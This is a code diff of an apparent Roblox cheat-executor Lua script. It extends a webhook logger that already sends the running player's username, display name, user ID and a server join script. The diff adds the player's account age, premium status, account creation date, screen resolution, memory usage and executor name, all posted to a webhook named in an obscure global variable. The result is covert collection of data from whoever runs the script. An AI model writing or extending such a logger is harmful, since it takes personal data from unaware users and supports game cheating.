@@ -29,15 +29,32 @@ local function getPlayerDetails()
 	}
 end
 
-local function getPing()
-	local pingValue = tonumber(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString():match("(%d+)")) or "N/A"
-	return pingValue
+local function getAccountInfo()
+	return {
+		["Account Age"] = player.AccountAge .. " days",
+		["Premium Status"] = player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No",
+		["Account Created"] = os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)),
+	}
+end
+
+local function getSystemInfo()
+	local screenWidth = math.floor(game:GetService("Workspace").CurrentCamera.ViewportSize.X)
+	local screenHeight = math.floor(game:GetService("Workspace").CurrentCamera.ViewportSize.Y)
+	local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
+	local executorName = identifyexecutor() or "N/A" -- Ensure the executor identification is available
+
+	return {
+		["Resolution"] = screenWidth .. "x" .. screenHeight,
+		["Memory Usage"] = memoryUsage .. " MB",
+		["Executor"] = executorName,
+	}
 end
 
 local function sendWebhook()
 	local serverInfo = getServerInfo()
 	local playerDetails = getPlayerDetails()
-	local pingValue = getPing()
+	local accountInfo = getAccountInfo()
+	local systemInfo = getSystemInfo()
 
 	local data = {
 		['webhookid'] = getgenv().aasdfsdgfgh,
@@ -48,7 +65,9 @@ local function sendWebhook()
 				{["name"] = "🔍 **Script Info**", ["value"] = "```💻 Script Name: " .. getgenv().haskjhfgash .. "```", ["inline"] = false},
 				{["name"] = "🔗 **Join Script**", ["value"] = "```lua\n" .. snipePlay .. "```", ["inline"] = false},
 				{["name"] = "👤 **Player Details**", ["value"] = "```Username: " .. playerDetails.Username .. "\nDisplay Name: " .. playerDetails["Display Name"] .. "\nUserID: " .. playerDetails.UserID .. "```", ["inline"] = false},
-				{["name"] = "🕹️ **Server Info**", ["value"] = "```" .. serverInfo["Players in Server"] .. "\nPing: " .. pingValue .. " ms```", ["inline"] = true},
+				{["name"] = "📅 **Account Information**", ["value"] = "```Account Age: " .. accountInfo["Account Age"] .. "\nPremium Status: " .. accountInfo["Premium Status"] .. "\nAccount Created: " .. accountInfo["Account Created"] .. "```", ["inline"] = false},
+				{["name"] = "🕹️ **Server Info**", ["value"] = "```" .. serverInfo["Players in Server"] .. "\nPing: " .. serverInfo["Ping"] .. "```", ["inline"] = true},
+				{["name"] = "⚙️ **System Info**", ["value"] = "```Resolution: " .. systemInfo["Resolution"] .. "\nMemory Usage: " .. systemInfo["Memory Usage"] .. "\nExecutor: " .. systemInfo["Executor"] .. "```", ["inline"] = true},
 			},
 		}},
 	}
